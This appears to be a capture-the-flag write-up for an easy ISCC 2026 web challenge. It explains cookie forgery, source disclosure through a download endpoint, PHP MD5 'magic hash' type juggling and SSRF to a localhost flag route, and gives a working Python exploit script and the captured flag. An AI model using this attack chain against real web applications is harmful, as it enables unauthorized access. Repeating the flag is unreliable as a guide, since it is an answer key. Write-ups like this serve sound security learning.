---
title: "值班邮件台"
ctf: "ISCC 2026"
date: 2026-05-09
category: web
difficulty: easy
points: 100
flag_format: "ISCC{...}"
author: "writeup"
---

# 值班邮件台

## Summary

A web email application with cookie-based authentication, exposed source code via a file download endpoint, PHP type juggling in a dual-review check, and SSRF to an internal flag endpoint.

## Solution

### Step 1: Cookie Manipulation

The main page sets `mail_role=user`. Changing it to `admin` grants access to `/admin.php`, which reveals a file download endpoint and a diagnostic request form.

### Step 2: Source Code Disclosure

`/download.php` has an incomplete whitelist — it leaks `admin.php` source code and `/files/notes/route-index.txt` which contains internal route aliases. The `admin.php` source reveals a dual-review validation with a PHP type juggling vulnerability, and `route-index.txt` shows the internal route `final -> /internal/report?view=flag&slot=last`.

### Step 3: PHP Type Juggling

The dual-review check compares MD5 hashes with loose equality (`==`) but requires strict inequality (`!==`). Using two strings whose MD5 hashes both start with `0e` followed only by digits bypasses this check (PHP interprets them as `0` in scientific notation).

### Step 4: SSRF + URL Encoding

The admin panel makes requests to the `target_url` internally. The `/internal/report` endpoint is IP-restricted (403 from external), but the server can reach itself via `http://127.0.0.1`. The URL `?view=flag&slot=last` must be URL-encoded so `&` isn't parsed as a separate POST parameter.

```python
import requests

URL = "http://39.105.213.28:49103"
cookies = {"mail_user": "guest", "mail_role": "admin"}
data = {
    "token_a": "240610708",
    "token_b": "QNKCDZO",
    "target_url": "http://127.0.0.1/internal/report?view=flag&slot=last"
}
r = requests.post(URL + "/admin.php", cookies=cookies, data=data)
flag = r.text.split("ISCC{")[1].split("}")[0]
print(f"ISCC{{{flag}}}")
```

## Flag

```
ISCC{ACxmCnWgL3C7LqWImKfgtK6h}
```
